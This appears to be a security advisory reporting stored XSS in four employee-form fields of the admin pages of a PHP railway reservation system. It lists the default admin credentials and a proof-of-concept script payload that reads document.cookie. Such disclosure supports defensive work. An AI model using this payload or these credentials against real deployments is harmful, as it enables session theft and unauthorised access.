# Online Railway Reservation System
## Stored XSS on `/admin/admin-add-employee.php` and `/admin/admin-update-employee.php`

### Vendor Homepage:

```
https://codeastro.com/online-railway-reservation-system-in-php-with-source-code/
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://localhost/ORRS-PHP/admin/emp-login.php
Email   : admin@mail.com
Password: codeastro.com
```

### Affected Page:

```
/admin/admin-add-employee.php
/admin/admin-update-employee.php
```

The parameter  `emp_fname` , `emp_lname` , `emp_nat_idno` and `emp_addr`  are being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

``` PHP Code
# /admin/admin-add-employee.php

<input class="form-control" name="emp_fname" id="inputText3" type="text">
<input class="form-control" name="emp_lname" id="inputText3" type="text">
<input class="form-control" name="emp_nat_idno" id="inputText3" type="text">
<input class="form-control" name="emp_addr" id="inputText3" type="text">

# /admin/admin-update-employee.php

<input class="form-control" name="emp_fname" id="inputText3" type="text">
<input class="form-control" name="emp_lname" id="inputText3" type="text">
<input class="form-control" name="emp_nat_idno" id="inputText3" type="text">
<input class="form-control" name="emp_addr" id="inputText3" type="text">

```

### Proof of Concept:

Payload:

```
<script>alert(document.cookie)</script>

```


### Screenshot




